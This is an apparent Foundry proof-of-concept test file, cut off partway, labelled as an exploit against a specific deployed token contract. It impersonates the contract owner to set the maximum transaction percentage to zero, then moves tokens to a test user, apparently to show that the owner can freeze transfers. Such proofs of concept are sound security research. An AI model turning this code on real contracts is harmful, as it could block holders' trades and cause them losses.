import "forge-std/Test.sol";

interface WEB3 {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd0c4BC1B89BbD105EeCb7EBa3f13E7648c0De38F;
    address attacker = address(this);
    address owner;
    address testUser = address(0x123);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the already deployed contract at TARGET
        owner = WEB3(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Create a test user
        vm.label(testUser, "Test User");

        // Give test user some initial ETH for gas
        deal(testUser, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate the owner and set maxTxPercent to 0
        vm.startPrank(owner);
        WEB3(TARGET).setMaxTxPercent(0);
        vm.stopPrank();

        // Verify _maxTxAmount is now 0
        uint256 maxTxAmount = WEB3(TARGET)._maxTxAmount();
        require(maxTxAmount == 0, "maxTxAmount should be 0");

        // Step 2: Give test user some tokens (owner transfers to test user)
        vm.startPrank(owner);
        WEB3(TARGET).transfer(testUser, 1000 * 10**9); // Transfer some tokens (accounting for 9 decimals)
